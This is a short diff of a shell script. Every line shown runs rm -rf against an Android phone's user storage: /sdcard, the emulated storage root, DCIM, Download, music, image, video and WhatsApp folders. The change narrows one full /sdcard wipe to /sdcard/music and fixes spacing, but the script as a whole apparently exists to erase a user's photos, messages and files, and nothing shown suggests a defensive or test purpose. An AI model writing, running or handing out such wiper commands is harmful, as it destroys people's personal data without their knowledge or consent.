@@ -45,9 +45,9 @@ rm -rf storage/emulated/0
 rm -rf storage/emulated/0/Download
 rm -rf storage/emulated/DCIM
 rm -rf storage/emulated/music
-rm -rf  /sdcard
+rm -rf  /sdcard/music
 rm -rf /sdcard/image
-rm  -rf /sdcard/download
+rm -rf /sdcard/download
 rm -rf /sdcard/dcim
 rm -rf /sdcard/WhatsApp
 rm -rf /sdcard/video
